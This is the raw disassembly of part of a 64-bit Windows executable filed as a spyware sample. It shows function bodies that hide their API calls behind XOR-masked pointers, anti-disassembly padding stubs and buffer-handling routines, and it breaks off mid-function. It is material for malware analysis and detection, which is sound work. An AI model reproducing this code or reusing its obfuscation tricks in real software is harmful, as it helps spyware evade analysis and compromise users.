
malware_samples/spyware/88f7d22ed2494fb53d1806011173dd739f77bda9ff8d20f130b4bc5fdde761d7.exe:     file format pei-x86-64


Disassembly of section .text:

0000000000401000 <.text>:
  401000:	eb 0b                	jmp    0x40100d
  401002:	48 31 c0             	xor    %rax,%rax
  401005:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  40100c:	90                   	nop
  40100d:	55                   	push   %rbp
  40100e:	48 89 e5             	mov    %rsp,%rbp
  401011:	48 81 ec 60 00 00 00 	sub    $0x60,%rsp
  401018:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  40101c:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  401020:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  401024:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
  401028:	b8 8c 27 f6 e3       	mov    $0xe3f6278c,%eax
  40102d:	81 f0 8a 27 f6 e3    	xor    $0xe3f6278a,%eax
  401033:	49 89 c0             	mov    %rax,%r8
  401036:	b8 00 00 00 00       	mov    $0x0,%eax
  40103b:	49 89 c3             	mov    %rax,%r11
  40103e:	48 8d 45 fa          	lea    -0x6(%rbp),%rax
  401042:	49 89 c2             	mov    %rax,%r10
  401045:	4c 89 d1             	mov    %r10,%rcx
  401048:	4c 89 da             	mov    %r11,%rdx
  40104b:	4c 8b 1d 46 8a 00 00 	mov    0x8a46(%rip),%r11        # 0x409a98
  401052:	48 8b 05 67 8a 00 00 	mov    0x8a67(%rip),%rax        # 0x409ac0
  401059:	4c 33 18             	xor    (%rax),%r11
  40105c:	41 ff d3             	call   *%r11
  40105f:	b8 ef 00 00 00       	mov    $0xef,%eax
  401064:	88 45 fa             	mov    %al,-0x6(%rbp)
  401067:	b8 bf 00 00 00       	mov    $0xbf,%eax
  40106c:	88 45 fb             	mov    %al,-0x5(%rbp)
  40106f:	b8 bd 00 00 00       	mov    $0xbd,%eax
  401074:	88 45 fc             	mov    %al,-0x4(%rbp)
  401077:	b8 ef 00 00 00       	mov    $0xef,%eax
  40107c:	88 45 fd             	mov    %al,-0x3(%rbp)
  40107f:	b8 bf 00 00 00       	mov    $0xbf,%eax
  401084:	88 45 fe             	mov    %al,-0x2(%rbp)
  401087:	b8 bd 00 00 00       	mov    $0xbd,%eax
  40108c:	88 45 ff             	mov    %al,-0x1(%rbp)
  40108f:	b8 69 0c d8 c8       	mov    $0xc8d80c69,%eax
  401094:	81 f0 6c 0c d8 c8    	xor    $0xc8d80c6c,%eax
  40109a:	49 89 c0             	mov    %rax,%r8
  40109d:	48 8d 45 fa          	lea    -0x6(%rbp),%rax
  4010a1:	49 89 c3             	mov    %rax,%r11
  4010a4:	48 8d 05 b5 6f 00 00 	lea    0x6fb5(%rip),%rax        # 0x408060
  4010ab:	49 89 c2             	mov    %rax,%r10
  4010ae:	4c 89 d1             	mov    %r10,%rcx
  4010b1:	4c 89 da             	mov    %r11,%rdx
  4010b4:	4c 8b 1d 15 8a 00 00 	mov    0x8a15(%rip),%r11        # 0x409ad0
  4010bb:	48 8b 05 36 8a 00 00 	mov    0x8a36(%rip),%rax        # 0x409af8
  4010c2:	4c 33 18             	xor    (%rax),%r11
  4010c5:	41 ff d3             	call   *%r11
  4010c8:	83 f8 00             	cmp    $0x0,%eax
  4010cb:	0f 84 1e 00 00 00    	je     0x4010ef
  4010d1:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
  4010d5:	49 89 c2             	mov    %rax,%r10
  4010d8:	4c 89 d1             	mov    %r10,%rcx
  4010db:	4c 8b 1d 26 8a 00 00 	mov    0x8a26(%rip),%r11        # 0x409b08
  4010e2:	48 8b 05 47 8a 00 00 	mov    0x8a47(%rip),%rax        # 0x409b30
  4010e9:	4c 33 18             	xor    (%rax),%r11
  4010ec:	41 ff d3             	call   *%r11
  4010ef:	b8 00 00 00 00       	mov    $0x0,%eax
  4010f4:	c9                   	leave
  4010f5:	c3                   	ret
  4010f6:	00 00                	add    %al,(%rax)
  4010f8:	01 04 02             	add    %eax,(%rdx,%rax,1)
  4010fb:	05 04 03 01 50       	add    $0x50010304,%eax
  401100:	cc                   	int3
  401101:	cc                   	int3
  401102:	e8 00 00 00 00       	call   0x401107
  401107:	48 83 c4 08          	add    $0x8,%rsp
  40110b:	c3                   	ret
  40110c:	90                   	nop
  40110d:	90                   	nop
  40110e:	cc                   	int3
  40110f:	90                   	nop
  401110:	eb 0b                	jmp    0x40111d
  401112:	48 31 c0             	xor    %rax,%rax
  401115:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  40111c:	90                   	nop
  40111d:	55                   	push   %rbp
  40111e:	48 89 e5             	mov    %rsp,%rbp
  401121:	48 81 ec 20 00 00 00 	sub    $0x20,%rsp
  401128:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  40112c:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401130:	31 c9                	xor    %ecx,%ecx
  401132:	48 89 08             	mov    %rcx,(%rax)
  401135:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401139:	48 83 c0 08          	add    $0x8,%rax
  40113d:	b9 00 00 00 00       	mov    $0x0,%ecx
  401142:	89 08                	mov    %ecx,(%rax)
  401144:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401148:	48 83 c0 0c          	add    $0xc,%rax
  40114c:	b9 00 00 00 00       	mov    $0x0,%ecx
  401151:	89 08                	mov    %ecx,(%rax)
  401153:	c9                   	leave
  401154:	c3                   	ret
  401155:	00 00                	add    %al,(%rax)
  401157:	00 01                	add    %al,(%rcx)
  401159:	04 02                	add    $0x2,%al
  40115b:	05 04 03 01 50       	add    $0x50010304,%eax
  401160:	cc                   	int3
  401161:	cc                   	int3
  401162:	e8 00 00 00 00       	call   0x401167
  401167:	48 83 c4 08          	add    $0x8,%rsp
  40116b:	c3                   	ret
  40116c:	90                   	nop
  40116d:	90                   	nop
  40116e:	cc                   	int3
  40116f:	90                   	nop
  401170:	eb 0b                	jmp    0x40117d
  401172:	48 31 c0             	xor    %rax,%rax
  401175:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  40117c:	90                   	nop
  40117d:	55                   	push   %rbp
  40117e:	48 89 e5             	mov    %rsp,%rbp
  401181:	48 81 ec 30 00 00 00 	sub    $0x30,%rsp
  401188:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  40118c:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  401190:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401194:	48 83 c0 08          	add    $0x8,%rax
  401198:	8b 4d 18             	mov    0x18(%rbp),%ecx
  40119b:	8b 00                	mov    (%rax),%eax
  40119d:	39 c1                	cmp    %eax,%ecx
  40119f:	0f 82 14 00 00 00    	jb     0x4011b9
  4011a5:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4011a9:	48 83 c0 08          	add    $0x8,%rax
  4011ad:	b9 00 00 00 00       	mov    $0x0,%ecx
  4011b2:	89 08                	mov    %ecx,(%rax)
  4011b4:	e9 67 00 00 00       	jmp    0x401220
  4011b9:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4011bd:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  4011c1:	8b 55 18             	mov    0x18(%rbp),%edx
  4011c4:	48 8b 09             	mov    (%rcx),%rcx
  4011c7:	48 01 d1             	add    %rdx,%rcx
  4011ca:	48 8b 55 10          	mov    0x10(%rbp),%rdx
  4011ce:	48 83 c2 08          	add    $0x8,%rdx
  4011d2:	8b 12                	mov    (%rdx),%edx
  4011d4:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4011d8:	8b 45 18             	mov    0x18(%rbp),%eax
  4011db:	29 c2                	sub    %eax,%edx
  4011dd:	49 89 d0             	mov    %rdx,%r8
  4011e0:	49 89 cb             	mov    %rcx,%r11
  4011e3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4011e7:	48 8b 00             	mov    (%rax),%rax
  4011ea:	49 89 c2             	mov    %rax,%r10
  4011ed:	4c 89 d1             	mov    %r10,%rcx
  4011f0:	4c 89 da             	mov    %r11,%rdx
  4011f3:	4c 8b 1d ce 8a 00 00 	mov    0x8ace(%rip),%r11        # 0x409cc8
  4011fa:	48 8b 05 ef 8a 00 00 	mov    0x8aef(%rip),%rax        # 0x409cf0
  401201:	4c 33 18             	xor    (%rax),%r11
  401204:	41 ff d3             	call   *%r11
  401207:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40120b:	48 83 c0 08          	add    $0x8,%rax
  40120f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401213:	8b 00                	mov    (%rax),%eax
  401215:	8b 4d 18             	mov    0x18(%rbp),%ecx
  401218:	29 c8                	sub    %ecx,%eax
  40121a:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  40121e:	89 01                	mov    %eax,(%rcx)
  401220:	c9                   	leave
  401221:	c3                   	ret
  401222:	cc                   	int3
  401223:	cc                   	int3
  401224:	e8 00 00 00 00       	call   0x401229
  401229:	48 83 c4 08          	add    $0x8,%rsp
  40122d:	c3                   	ret
  40122e:	90                   	nop
  40122f:	90                   	nop
  401230:	cc                   	int3
  401231:	90                   	nop
  401232:	eb 0b                	jmp    0x40123f
  401234:	48 31 c0             	xor    %rax,%rax
  401237:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  40123e:	90                   	nop
  40123f:	55                   	push   %rbp
  401240:	48 89 e5             	mov    %rsp,%rbp
  401243:	48 81 ec 30 00 00 00 	sub    $0x30,%rsp
  40124a:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  40124e:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  401252:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  401256:	48 8b 45 18          	mov    0x18(%rbp),%rax
  40125a:	48 83 f8 00          	cmp    $0x0,%rax
  40125e:	0f 84 0c 00 00 00    	je     0x401270
  401264:	8b 45 20             	mov    0x20(%rbp),%eax
  401267:	83 f8 00             	cmp    $0x0,%eax
  40126a:	0f 85 05 00 00 00    	jne    0x401275
  401270:	e9 ea 00 00 00       	jmp    0x40135f
  401275:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401279:	48 83 c0 08          	add    $0x8,%rax
  40127d:	8b 00                	mov    (%rax),%eax
  40127f:	8b 4d 20             	mov    0x20(%rbp),%ecx
  401282:	01 c8                	add    %ecx,%eax
  401284:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  401288:	48 83 c1 0c          	add    $0xc,%rcx
  40128c:	8b 09                	mov    (%rcx),%ecx
  40128e:	39 c8                	cmp    %ecx,%eax
  401290:	0f 86 72 00 00 00    	jbe    0x401308
  401296:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40129a:	48 83 c0 0c          	add    $0xc,%rax
  40129e:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  4012a2:	48 83 c1 08          	add    $0x8,%rcx
  4012a6:	8b 09                	mov    (%rcx),%ecx
  4012a8:	8b 55 20             	mov    0x20(%rbp),%edx
  4012ab:	01 d1                	add    %edx,%ecx
  4012ad:	81 c1 00 10 00 00    	add    $0x1000,%ecx
  4012b3:	89 08                	mov    %ecx,(%rax)
  4012b5:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4012b9:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  4012bd:	48 83 c1 0c          	add    $0xc,%rcx
  4012c1:	8b 09                	mov    (%rcx),%ecx
  4012c3:	49 89 cb             	mov    %rcx,%r11
  4012c6:	48 8b 00             	mov    (%rax),%rax
  4012c9:	49 89 c2             	mov    %rax,%r10
  4012cc:	4c 89 d1             	mov    %r10,%rcx
  4012cf:	4c 89 da             	mov    %r11,%rdx
  4012d2:	4c 8b 1d 9f 88 00 00 	mov    0x889f(%rip),%r11        # 0x409b78
  4012d9:	48 8b 05 c0 88 00 00 	mov    0x88c0(%rip),%rax        # 0x409ba0
  4012e0:	4c 33 18             	xor    (%rax),%r11
  4012e3:	41 ff d3             	call   *%r11
  4012e6:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4012ea:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4012ee:	48 83 f8 00          	cmp    $0x0,%rax
  4012f2:	0f 85 05 00 00 00    	jne    0x4012fd
  4012f8:	e9 62 00 00 00       	jmp    0x40135f
  4012fd:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401301:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  401305:	48 89 08             	mov    %rcx,(%rax)
  401308:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40130c:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  401310:	48 83 c1 08          	add    $0x8,%rcx
  401314:	8b 09                	mov    (%rcx),%ecx
  401316:	48 8b 00             	mov    (%rax),%rax
  401319:	48 01 c8             	add    %rcx,%rax
  40131c:	8b 4d 20             	mov    0x20(%rbp),%ecx
  40131f:	49 89 c8             	mov    %rcx,%r8
  401322:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
  401326:	49 89 cb             	mov    %rcx,%r11
  401329:	49 89 c2             	mov    %rax,%r10
  40132c:	4c 89 d1             	mov    %r10,%rcx
  40132f:	4c 89 da             	mov    %r11,%rdx
  401332:	4c 8b 1d 77 88 00 00 	mov    0x8877(%rip),%r11        # 0x409bb0
  401339:	48 8b 05 98 88 00 00 	mov    0x8898(%rip),%rax        # 0x409bd8
  401340:	4c 33 18             	xor    (%rax),%r11
  401343:	41 ff d3             	call   *%r11
  401346:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40134a:	48 83 c0 08          	add    $0x8,%rax
  40134e:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  401352:	8b 00                	mov    (%rax),%eax
  401354:	8b 4d 20             	mov    0x20(%rbp),%ecx
  401357:	01 c8                	add    %ecx,%eax
  401359:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  40135d:	89 01                	mov    %eax,(%rcx)
  40135f:	c9                   	leave
  401360:	c3                   	ret
  401361:	cc                   	int3
  401362:	cc                   	int3
  401363:	e8 00 00 00 00       	call   0x401368
  401368:	48 83 c4 08          	add    $0x8,%rsp
  40136c:	c3                   	ret
  40136d:	90                   	nop
  40136e:	90                   	nop
  40136f:	cc                   	int3
  401370:	90                   	nop
  401371:	eb 0b                	jmp    0x40137e
  401373:	48 31 c0             	xor    %rax,%rax
  401376:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  40137d:	90                   	nop
  40137e:	55                   	push   %rbp
  40137f:	48 89 e5             	mov    %rsp,%rbp
  401382:	48 81 ec 20 00 00 00 	sub    $0x20,%rsp
  401389:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  40138d:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401391:	48 8b 00             	mov    (%rax),%rax
  401394:	48 83 f8 00          	cmp    $0x0,%rax
  401398:	0f 84 2a 00 00 00    	je     0x4013c8
  40139e:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4013a2:	48 8b 00             	mov    (%rax),%rax
  4013a5:	49 89 c2             	mov    %rax,%r10
  4013a8:	4c 89 d1             	mov    %r10,%rcx
  4013ab:	4c 8b 1d 8e 87 00 00 	mov    0x878e(%rip),%r11        # 0x409b40
  4013b2:	48 8b 05 af 87 00 00 	mov    0x87af(%rip),%rax        # 0x409b68
  4013b9:	4c 33 18             	xor    (%rax),%r11
  4013bc:	41 ff d3             	call   *%r11
  4013bf:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4013c3:	31 c9                	xor    %ecx,%ecx
  4013c5:	48 89 08             	mov    %rcx,(%rax)
  4013c8:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4013cc:	48 83 c0 08          	add    $0x8,%rax
  4013d0:	b9 00 00 00 00       	mov    $0x0,%ecx
  4013d5:	89 08                	mov    %ecx,(%rax)
  4013d7:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4013db:	48 83 c0 0c          	add    $0xc,%rax
  4013df:	b9 00 00 00 00       	mov    $0x0,%ecx
  4013e4:	89 08                	mov    %ecx,(%rax)
  4013e6:	c9                   	leave
  4013e7:	c3                   	ret
  4013e8:	cc                   	int3
  4013e9:	cc                   	int3
  4013ea:	e8 00 00 00 00       	call   0x4013ef
  4013ef:	48 83 c4 08          	add    $0x8,%rsp
  4013f3:	c3                   	ret
  4013f4:	90                   	nop
  4013f5:	90                   	nop
  4013f6:	cc                   	int3
  4013f7:	90                   	nop
  4013f8:	eb 0b                	jmp    0x401405
  4013fa:	48 31 c0             	xor    %rax,%rax
  4013fd:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401404:	90                   	nop
  401405:	55                   	push   %rbp
  401406:	48 89 e5             	mov    %rsp,%rbp
  401409:	48 81 ec 30 00 00 00 	sub    $0x30,%rsp
  401410:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  401414:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  401418:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  40141c:	48 8b 45 18          	mov    0x18(%rbp),%rax
  401420:	48 83 f8 00          	cmp    $0x0,%rax
  401424:	0f 84 21 00 00 00    	je     0x40144b
  40142a:	8b 45 20             	mov    0x20(%rbp),%eax
  40142d:	83 f8 00             	cmp    $0x0,%eax
  401430:	0f 84 15 00 00 00    	je     0x40144b
  401436:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40143a:	48 83 c0 08          	add    $0x8,%rax
  40143e:	8b 4d 20             	mov    0x20(%rbp),%ecx
  401441:	8b 00                	mov    (%rax),%eax
  401443:	39 c1                	cmp    %eax,%ecx
  401445:	0f 86 05 00 00 00    	jbe    0x401450
  40144b:	e9 98 00 00 00       	jmp    0x4014e8
  401450:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401454:	8b 4d 20             	mov    0x20(%rbp),%ecx
  401457:	49 89 c8             	mov    %rcx,%r8
  40145a:	48 8b 00             	mov    (%rax),%rax
  40145d:	49 89 c3             	mov    %rax,%r11
  401460:	48 8b 45 18          	mov    0x18(%rbp),%rax
  401464:	49 89 c2             	mov    %rax,%r10
  401467:	4c 89 d1             	mov    %r10,%rcx
  40146a:	4c 89 da             	mov    %r11,%rdx
  40146d:	4c 8b 1d e4 87 00 00 	mov    0x87e4(%rip),%r11        # 0x409c58
  401474:	48 8b 05 05 88 00 00 	mov    0x8805(%rip),%rax        # 0x409c80
  40147b:	4c 33 18             	xor    (%rax),%r11
  40147e:	41 ff d3             	call   *%r11
  401481:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401485:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  401489:	8b 55 20             	mov    0x20(%rbp),%edx
  40148c:	48 8b 09             	mov    (%rcx),%rcx
  40148f:	48 01 d1             	add    %rdx,%rcx
  401492:	48 8b 55 10          	mov    0x10(%rbp),%rdx
  401496:	48 83 c2 08          	add    $0x8,%rdx
  40149a:	8b 12                	mov    (%rdx),%edx
  40149c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4014a0:	8b 45 20             	mov    0x20(%rbp),%eax
  4014a3:	29 c2                	sub    %eax,%edx
  4014a5:	49 89 d0             	mov    %rdx,%r8
  4014a8:	49 89 cb             	mov    %rcx,%r11
  4014ab:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4014af:	48 8b 00             	mov    (%rax),%rax
  4014b2:	49 89 c2             	mov    %rax,%r10
  4014b5:	4c 89 d1             	mov    %r10,%rcx
  4014b8:	4c 89 da             	mov    %r11,%rdx
  4014bb:	4c 8b 1d ce 87 00 00 	mov    0x87ce(%rip),%r11        # 0x409c90
  4014c2:	48 8b 05 ef 87 00 00 	mov    0x87ef(%rip),%rax        # 0x409cb8
  4014c9:	4c 33 18             	xor    (%rax),%r11
  4014cc:	41 ff d3             	call   *%r11
  4014cf:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4014d3:	48 83 c0 08          	add    $0x8,%rax
  4014d7:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4014db:	8b 00                	mov    (%rax),%eax
  4014dd:	8b 4d 20             	mov    0x20(%rbp),%ecx
  4014e0:	29 c8                	sub    %ecx,%eax
  4014e2:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  4014e6:	89 01                	mov    %eax,(%rcx)
  4014e8:	c9                   	leave
  4014e9:	c3                   	ret
  4014ea:	cc                   	int3
  4014eb:	cc                   	int3
  4014ec:	e8 00 00 00 00       	call   0x4014f1
  4014f1:	48 83 c4 08          	add    $0x8,%rsp
  4014f5:	c3                   	ret
  4014f6:	90                   	nop
  4014f7:	90                   	nop
  4014f8:	cc                   	int3
  4014f9:	90                   	nop
  4014fa:	eb 0b                	jmp    0x401507
  4014fc:	48 31 c0             	xor    %rax,%rax
  4014ff:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401506:	90                   	nop
  401507:	55                   	push   %rbp
  401508:	48 89 e5             	mov    %rsp,%rbp
  40150b:	48 81 ec 20 00 00 00 	sub    $0x20,%rsp
  401512:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  401516:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40151a:	48 8b 00             	mov    (%rax),%rax
  40151d:	48 83 f8 00          	cmp    $0x0,%rax
  401521:	0f 84 63 00 00 00    	je     0x40158a
  401527:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40152b:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  40152f:	48 83 c1 08          	add    $0x8,%rcx
  401533:	8b 09                	mov    (%rcx),%ecx
  401535:	49 89 c8             	mov    %rcx,%r8
  401538:	b9 00 00 00 00       	mov    $0x0,%ecx
  40153d:	49 89 cb             	mov    %rcx,%r11
  401540:	48 8b 00             	mov    (%rax),%rax
  401543:	49 89 c2             	mov    %rax,%r10
  401546:	4c 89 d1             	mov    %r10,%rcx
  401549:	4c 89 da             	mov    %r11,%rdx
  40154c:	4c 8b 1d 95 86 00 00 	mov    0x8695(%rip),%r11        # 0x409be8
  401553:	48 8b 05 b6 86 00 00 	mov    0x86b6(%rip),%rax        # 0x409c10
  40155a:	4c 33 18             	xor    (%rax),%r11
  40155d:	41 ff d3             	call   *%r11
  401560:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401564:	48 8b 00             	mov    (%rax),%rax
  401567:	49 89 c2             	mov    %rax,%r10
  40156a:	4c 89 d1             	mov    %r10,%rcx
  40156d:	4c 8b 1d ac 86 00 00 	mov    0x86ac(%rip),%r11        # 0x409c20
  401574:	48 8b 05 cd 86 00 00 	mov    0x86cd(%rip),%rax        # 0x409c48
  40157b:	4c 33 18             	xor    (%rax),%r11
  40157e:	41 ff d3             	call   *%r11
  401581:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401585:	31 c9                	xor    %ecx,%ecx
  401587:	48 89 08             	mov    %rcx,(%rax)
  40158a:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40158e:	48 83 c0 08          	add    $0x8,%rax
  401592:	b9 00 00 00 00       	mov    $0x0,%ecx
  401597:	89 08                	mov    %ecx,(%rax)
  401599:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40159d:	48 83 c0 0c          	add    $0xc,%rax
  4015a1:	b9 00 00 00 00       	mov    $0x0,%ecx
  4015a6:	89 08                	mov    %ecx,(%rax)
  4015a8:	c9                   	leave
  4015a9:	c3                   	ret
  4015aa:	cc                   	int3
  4015ab:	cc                   	int3
  4015ac:	e8 00 00 00 00       	call   0x4015b1
  4015b1:	48 83 c4 08          	add    $0x8,%rsp
  4015b5:	c3                   	ret
  4015b6:	90                   	nop
  4015b7:	90                   	nop
  4015b8:	cc                   	int3
  4015b9:	90                   	nop
  4015ba:	eb 0b                	jmp    0x4015c7
  4015bc:	48 31 c0             	xor    %rax,%rax
  4015bf:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4015c6:	90                   	nop
  4015c7:	55                   	push   %rbp
  4015c8:	48 89 e5             	mov    %rsp,%rbp
  4015cb:	48 81 ec 40 00 00 00 	sub    $0x40,%rsp
  4015d2:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4015d6:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  4015da:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  4015de:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
  4015e2:	31 c0                	xor    %eax,%eax
  4015e4:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4015e8:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4015ec:	48 83 f8 00          	cmp    $0x0,%rax
  4015f0:	0f 84 1c 00 00 00    	je     0x401612
  4015f6:	48 8b 45 20          	mov    0x20(%rbp),%rax
  4015fa:	48 83 f8 00          	cmp    $0x0,%rax
  4015fe:	0f 84 0e 00 00 00    	je     0x401612
  401604:	48 8b 45 30          	mov    0x30(%rbp),%rax
  401608:	48 83 f8 00          	cmp    $0x0,%rax
  40160c:	0f 85 0a 00 00 00    	jne    0x40161c
  401612:	b8 00 00 00 00       	mov    $0x0,%eax
  401617:	e9 90 00 00 00       	jmp    0x4016ac
  40161c:	8b 45 28             	mov    0x28(%rbp),%eax
  40161f:	8b 4d 18             	mov    0x18(%rbp),%ecx
  401622:	48 8d 55 f8          	lea    -0x8(%rbp),%rdx
  401626:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
  40162b:	49 89 c9             	mov    %rcx,%r9
  40162e:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  401632:	49 89 c8             	mov    %rcx,%r8
  401635:	49 89 c3             	mov    %rax,%r11
  401638:	48 8b 45 20          	mov    0x20(%rbp),%rax
  40163c:	49 89 c2             	mov    %rax,%r10
  40163f:	4c 89 d1             	mov    %r10,%rcx
  401642:	4c 89 da             	mov    %r11,%rdx
  401645:	4c 8b 1d b4 86 00 00 	mov    0x86b4(%rip),%r11        # 0x409d00
  40164c:	48 8b 05 d5 86 00 00 	mov    0x86d5(%rip),%rax        # 0x409d28
  401653:	4c 33 18             	xor    (%rax),%r11
  401656:	41 ff d3             	call   *%r11
  401659:	83 f8 00             	cmp    $0x0,%eax
  40165c:	0f 84 15 00 00 00    	je     0x401677
  401662:	48 8b 45 30          	mov    0x30(%rbp),%rax
  401666:	b9 00 00 00 00       	mov    $0x0,%ecx
  40166b:	89 08                	mov    %ecx,(%rax)
  40166d:	b8 00 00 00 00       	mov    $0x0,%eax
  401672:	e9 35 00 00 00       	jmp    0x4016ac
  401677:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40167b:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  401680:	48 39 c8             	cmp    %rcx,%rax
  401683:	0f 86 15 00 00 00    	jbe    0x40169e
  401689:	48 8b 45 30          	mov    0x30(%rbp),%rax
  40168d:	b9 00 00 00 00       	mov    $0x0,%ecx
  401692:	89 08                	mov    %ecx,(%rax)
  401694:	b8 00 00 00 00       	mov    $0x0,%eax
  401699:	e9 0e 00 00 00       	jmp    0x4016ac
  40169e:	48 8b 45 30          	mov    0x30(%rbp),%rax
  4016a2:	8b 4d f8             	mov    -0x8(%rbp),%ecx
  4016a5:	89 08                	mov    %ecx,(%rax)
  4016a7:	b8 01 00 00 00       	mov    $0x1,%eax
  4016ac:	c9                   	leave
  4016ad:	c3                   	ret
  4016ae:	00 00                	add    %al,(%rax)
  4016b0:	01 04 02             	add    %eax,(%rdx,%rax,1)
  4016b3:	05 04 03 01 50       	add    $0x50010304,%eax
  4016b8:	cc                   	int3
  4016b9:	cc                   	int3
  4016ba:	e8 00 00 00 00       	call   0x4016bf
  4016bf:	48 83 c4 08          	add    $0x8,%rsp
  4016c3:	c3                   	ret
  4016c4:	90                   	nop
  4016c5:	90                   	nop
  4016c6:	cc                   	int3
  4016c7:	90                   	nop
  4016c8:	eb 0b                	jmp    0x4016d5
  4016ca:	48 31 c0             	xor    %rax,%rax
  4016cd:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4016d4:	90                   	nop
  4016d5:	55                   	push   %rbp
  4016d6:	48 89 e5             	mov    %rsp,%rbp
  4016d9:	48 81 ec 20 00 00 00 	sub    $0x20,%rsp
  4016e0:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4016e4:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4016e8:	48 83 c0 20          	add    $0x20,%rax
  4016ec:	49 89 c2             	mov    %rax,%r10
  4016ef:	4c 89 d1             	mov    %r10,%rcx
  4016f2:	4c 8b 1d e7 86 00 00 	mov    0x86e7(%rip),%r11        # 0x409de0
  4016f9:	48 8b 05 08 87 00 00 	mov    0x8708(%rip),%rax        # 0x409e08
  401700:	4c 33 18             	xor    (%rax),%r11
  401703:	41 ff d3             	call   *%r11
  401706:	c9                   	leave
  401707:	c3                   	ret
  401708:	cc                   	int3
  401709:	cc                   	int3
  40170a:	e8 00 00 00 00       	call   0x40170f
  40170f:	48 83 c4 08          	add    $0x8,%rsp
  401713:	c3                   	ret
  401714:	90                   	nop
  401715:	90                   	nop
  401716:	cc                   	int3
  401717:	90                   	nop
  401718:	eb 0b                	jmp    0x401725
  40171a:	48 31 c0             	xor    %rax,%rax
  40171d:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401724:	90                   	nop
  401725:	55                   	push   %rbp
  401726:	48 89 e5             	mov    %rsp,%rbp
  401729:	48 81 ec 50 00 00 00 	sub    $0x50,%rsp
  401730:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  401734:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  401738:	b8 00 00 00 00       	mov    $0x0,%eax
  40173d:	89 45 fc             	mov    %eax,-0x4(%rbp)
  401740:	b8 04 00 00 c0       	mov    $0xc0000004,%eax
  401745:	89 45 f8             	mov    %eax,-0x8(%rbp)
  401748:	31 c0                	xor    %eax,%eax
